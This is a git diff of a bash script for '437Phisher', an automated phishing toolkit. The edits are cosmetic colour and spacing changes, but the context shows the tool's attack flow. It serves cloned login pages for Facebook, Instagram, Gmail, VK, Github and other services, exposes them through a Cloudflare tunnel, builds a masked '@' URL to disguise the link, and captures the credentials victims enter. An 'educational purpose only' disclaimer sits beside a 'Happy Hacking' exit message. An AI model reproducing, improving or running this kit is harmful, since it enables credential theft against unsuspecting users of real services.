@@ -1,7 +1,7 @@
 #!/bin/bash
 
 
-##   437Phisher 	: 	Automated Phishing Tool+
+##   437phisher 	: 	Automated Phishing Tool+
 ##   Author 	: 	RenderBolt
 ##   Version 	: 	1.0
 ##   Github 	: 	https://github.com/RenderBolt96
@@ -80,7 +80,7 @@ ${CYAN} |__   _| ___) | / /  | .__/ | '_ \ | |/ __|| '_ \  / _ \| '__|
 ${CYAN}    |_|  |____/ /_/   | |    | | | || |\__ \| | | ||  __/| |   	
 ${CYAN}                      |_|    |_| |_||_||___/|_| |_| \___||_|   
 ${CYAN} ${RED}Version : 1.0
-   
+
 ${RED}[${MAGENTA}-${RED}]${CYAN} The Title Will ONLY DISPLAY PROPERLY If The Screen Is Turned HORZONTALLY!!! ${WHITE}
 ${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by RenderBolt ${WHITE}
 EOF
@@ -94,8 +94,8 @@ banner_small() {
 		 | |    | |  | || |   ](_' `_)[ | |    | |  | || |    
 		 | |    | |  | || |   `-. N ,-' | |    | |  | || |    
 		 | |___ | |__| || |___  |||||   | |___ | |__| || |___ 
-  		 |_____| \____/ |_____| `---'   |_____| \____/ |_____|
-     		     437Phisher----Respect Etanie----Version : 1.0
+   		 |_____| \____/ |_____| `---'   |_____| \____/ |_____|
+      			437Phisher----Respect Etanie----Version : 1.0
 	EOF
 }
 
@@ -113,7 +113,7 @@ dependencies() {
     fi
 
 	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${MAGENTA} Packages already installed."
 	else
 		pkgs=(php curl wget unzip)
 		for pkg in "${pkgs[@]}"; do
@@ -152,7 +152,7 @@ download_cloudflared() {
 		mv -f "$file" .server/cloudflared > /dev/null 2>&1
 		chmod +x .server/cloudflared > /dev/null 2>&1
 	else
-		echo -e "\n${RED}[${BLUE}!${RED}]${RED} Error occured, Install Cloudflared manually."
+		echo -e "\n${RED}[${RED}!${RED}]${RED} Error occured, Install Cloudflared manually."
 		{ reset_color; exit 1; }
 	fi
 }
@@ -162,9 +162,9 @@ download_cloudflared() {
 ## Install Cloudflared
 install_cloudflared() {
 	if [[ -e ".server/cloudflared" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${MAGENTA} Cloudflared already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${MAGENTA} Installing Cloudflared..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
@@ -182,7 +182,7 @@ install_cloudflared() {
 ## Exit message
 msg_exit() {
 	{ clear; banner; echo; }
-	echo -e "${GREENBG}${BLACK} Happy Hacking.${RESETBG}\n"
+	echo -e "${CYANBG}${BLACK} Happy Hacking.${RESETBG}\n"
 	{ reset_color; exit 0; }
 }
 
@@ -190,10 +190,10 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN}Author   ${RED}:  ${ORANGE}RenderBolt
-		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/RenderBolt96
-		${GREEN}Social   ${RED}:  ${CYAN}https://bit.ly/AKSHAYARJUN
-		${GREEN}Version  ${RED}:  ${ORANGE}1.0
+		${MAGENTA}Author   ${RED}:  ${ORANGE}RenderBolt
+		${MAGENTA}Github   ${RED}:  ${CYAN}https://github.com/RenderBolt96
+		${MAGENTA}Social   ${RED}:  ${CYAN}https://bit.ly/AKSHAYARJUN
+		${MAGENTA}Version  ${RED}:  ${ORANGE}1.0
 
 		${REDBG}${WHITE} Thanks : htr-tech,Adi1090x,MoisesTapia,ThelinuxChoice
 								  DarkSecDevelopers,Mustakim Ahmed,1RaY-1 ${RESETBG}
@@ -202,11 +202,11 @@ about() {
 		${CYAN}This Tool is made for educational purpose only ${RED}!${WHITE}
 		${CYAN}Author will not be responsible for any misuse of this toolkit ${RED}!${WHITE}
 
-		${MAGENTA}[${WHITE}00${MAGENTA}]${GREEN} Main Menu     ${MAGENTA}[${WHITE}99${MAGENTA}]${RED} Exit
+		${MAGENTA}[${WHITE}00${MAGENTA}]${MAGENTA} Main Menu     ${MAGENTA}[${WHITE}99${MAGENTA}]${MAGENTA} Exit
 
 	EOF
 
-	read -p "${BLUE}[${WHITE}-${BLUE}]${GREEN} Select an option : ${MAGENTA}"
+	read -p "${BLUE}[${WHITE}-${BLUE}]${MAGENTA} Select an option : ${MAGENTA}"
 
 	case $REPLY in 
 		99)
@@ -279,9 +279,9 @@ capture_data() {
 ## Start Cloudflared
 start_cloudflared() { 
         rm .cld.log > /dev/null 2>&1 &
-	echo -e "\n${RED}[${BLUE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}https://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${BLUE}-${RED}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}https://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
-	echo -ne "\n\n${RED}[${BLUE}-${RED}]${GREEN} Launching Cloudflared..."
+	echo -ne "\n\n${RED}[${BLUE}-${RED}]${MAGENTA} Launching Cloudflared..."
 
     if [[ `command -v termux-chroot` ]]; then
 		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
@@ -293,8 +293,8 @@ start_cloudflared() {
 	
 	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
 	cldflr_link1=${cldflr_link#https://}
-	echo -e "\n${RED}[${BLUE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
-	echo -e "\n${RED}[${BLUE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
+	echo -e "\n${RED}[${BLUE}-${RED}]${BLUE} URL 1 : ${MAGENTA}$cldflr_link"
+	echo -e "\n${RED}[${BLUE}-${RED}]${BLUE} URL 2 : ${MAGENTA}$mask@$cldflr_link1"
 	echo -e "\n If you are getting Argo Tunnel Error in the above links,please wait atleast 1 minute for the site to come alive."
 	capture_data
 }
@@ -308,7 +308,7 @@ tunnel_menu() {
 
 	EOF
 
-	echo "${RED}[${BLUE}-${RED}]${GREEN} Starting port forwarding by Cloudflared${BLUE}"
+	echo "${RED}[${BLUE}-${RED}]${MAGENTA} Starting port forwarding by Cloudflared${BLUE}"
 	start_cloudflared
 	
 	
@@ -326,7 +326,7 @@ site_facebook() {
 
 	EOF
 
-	read -p "${RED}[${BLUE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${BLUE}-${RED}]${MAGENTA} Select an option : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -362,7 +362,7 @@ site_instagram() {
 
 	EOF
 
-	read -p "${RED}[${BLUE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${BLUE}-${RED}]${MAGENTA} Select an option : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -397,7 +397,7 @@ site_gmail() {
 
 	EOF
 
-	read -p "${RED}[${BLUE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${BLUE}-${RED}]${MAGENTA} Select an option : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -427,7 +427,7 @@ site_vk() {
 
 	EOF
 
-	read -p "${RED}[${BLUE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${BLUE}-${RED}]${MAGENTA} Select an option : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -463,11 +463,11 @@ main_menu() {
 		${MAGENTA}[${CYAN}31${MAGENTA}]${BLUE} Mediafire     ${MAGENTA}[${CYAN}32${MAGENTA}]${BLUE} Gitlab       ${MAGENTA}[${CYAN}33${MAGENTA}]${BLUE} Github
 		${MAGENTA}[${CYAN}34${MAGENTA}]${BLUE} Airbnb
 
-		${CYAN}[${RED}99${CYAN}]${GREEN} About         ${CYAN}[${RED}00${CYAN}]${GREEN} Exit
+		${CYAN}[${RED}99${CYAN}]${MAGENTA} About         ${CYAN}[${RED}00${CYAN}]${MAGENTA} Exit
 
 	EOF
 	
-	read -p "${CYAN}[${WHITE}-${CYAN}]${GREEN} Select an option : ${BLUE}"
+	read -p "${CYAN}[${WHITE}-${CYAN}]${MAGENTA} Select an option : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
